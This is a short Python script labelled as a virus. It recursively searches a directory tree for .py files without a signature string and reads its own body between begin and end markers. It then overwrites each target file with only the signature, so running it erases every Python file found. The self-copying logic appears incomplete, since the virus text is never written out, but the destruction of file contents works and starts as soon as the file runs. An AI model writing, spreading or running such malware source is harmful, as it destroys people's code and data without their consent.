### VIRUS BEGIN ###

import os
import datetime

SIGN = "Luis Alvarez Sign"

def find_files(dir):
    target_files = []
    files = os.listdir(dir)

    for file_name in files:
        next_dir = dir + "/" + file_name

        if os.path.isdir(next_dir):
            target_files.extend(find_files(next_dir))
        elif file_name[-3:] == ".py":
            infected = False

            for line in open(next_dir):
                if SIGN in line:
                    infected = True
                    break

            if not infected:
                target_files.append(next_dir)

    return target_files



def infect(files):
    virus = open(os.path.abspath(__file__))
    virus_text = ""
    beginVirus = False
    for i, line in enumerate(virus):
        if "### VIRUS BEGIN ###" in line:
            beginVirus = True

        if beginVirus:
            if "### VIRUS END ###" not in line:
                virus_text += line
            else:
                break

    virus_text += "### VIRUS END ###" + chr(13) + chr(10)
    virus.close()

    for file_name in files:
        f = open(file_name)
        temp = f.read()
        f.close()
        f = open(file_name, "w")
        f.write(SIGN + " ")
        f.close()

infect(find_files(os.path.abspath(__file__)[:-7]))

### VIRUS END ###
